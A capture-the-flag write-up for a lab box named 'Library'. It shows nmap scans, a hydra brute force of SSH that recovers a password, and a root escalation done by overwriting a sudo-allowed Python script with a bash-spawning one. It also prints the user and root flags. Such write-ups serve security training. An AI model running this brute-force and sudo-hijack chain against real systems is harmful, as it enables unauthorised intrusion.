
# CTF Writeup: Library

---
## Reconaissance

An initial scan revealed the following information abt running services.

```
nmap -n -Pn -sS -p- 10.114.155.54            
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-04 14:59 CDT
Nmap scan report for 10.114.155.54
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 14.18 seconds
```

Another more detailled scan revealed the following information abt running services on the target server.

```
nmap -n -Pn -sSCV -p 22,80 10.114.155.54
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-04 15:00 CDT
Nmap scan report for 10.114.155.54
Host is up (0.011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.41 seconds
```

The webpage hints at an Blog called "Library Machine".

From the webpage itself it hints at users.

```
root
www-data
meliodas
```

Bruteforced ssh with user meliodas, since he is the only non-default user.

```
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.114.155.54
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-04 15:54:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.114.155.54:22/
[22][ssh] host: 10.114.155.54   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-04 15:55:13
```

Connected to the server as user meliodas with SSH.

```
ssh meliodas@10.114.155.54
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
meliodas@10.114.155.54's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Mon May  4 13:56:08 2026 from 192.168.227.246
meliodas@ubuntu:~$
```

Retrieved user.txt in /home/meliodas directory.

```
6d488cbb3f111d135722c33cb635f4ec
```

Checked sudo permissions of user "meliodas".

```
meliodas@ubuntu:/var/backups$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

He is able to run an script with sudo permissions within his directory! Which means we can replace the script, since we got write access. We deleted the script and created a new bak.py script.

```
#/usr/bin/python

import os

os.system("/bin/bash")
```

Executed the script and gained root shell.

```
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
root@ubuntu:~#
```

Retrieved root.txt in /root directory. 

```
e8c8c6c256c35515d1d344ee0488c617
```